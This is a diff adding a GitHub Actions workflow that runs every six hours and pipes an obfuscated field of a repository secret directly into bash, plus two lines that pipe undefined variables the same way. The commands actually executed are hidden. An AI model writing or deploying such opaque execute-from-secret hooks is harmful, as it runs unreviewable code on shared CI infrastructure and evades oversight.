@@ -1,0 +1,19 @@
+name: elijahcreate
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: elijahcreate
+        env:
+          qx35300: ${{ secrets.qx35300 }}
+        run: |
+          echo $qx35300 | jq -r .hzrq943 | /bin/bash
+          echo $mk54 | jq -r .an124 | /bin/bash
+          echo $ioz27479 | jq -r .jwt15768 | /bin/bash
+
